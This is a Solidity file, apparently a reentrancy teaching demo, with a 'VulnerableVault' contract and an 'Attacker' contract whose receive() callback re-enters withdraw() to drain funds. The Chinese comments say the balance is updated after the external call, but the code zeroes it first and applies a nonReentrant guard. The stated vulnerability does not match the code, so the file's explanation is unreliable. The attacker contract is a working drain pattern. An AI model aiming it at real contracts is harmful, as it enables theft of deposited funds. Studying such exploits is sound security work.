// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract VulnerableVault is ReentrancyGuard{
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");



        // 更新余额（放在调用后，导致漏洞）
        balances[msg.sender] = 0;

        // 发送 ETH（外部调用，容易被攻击者重入）
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        
    }
}

// Attacker.sol
contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    // 回调函数，趁机再次提取
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}
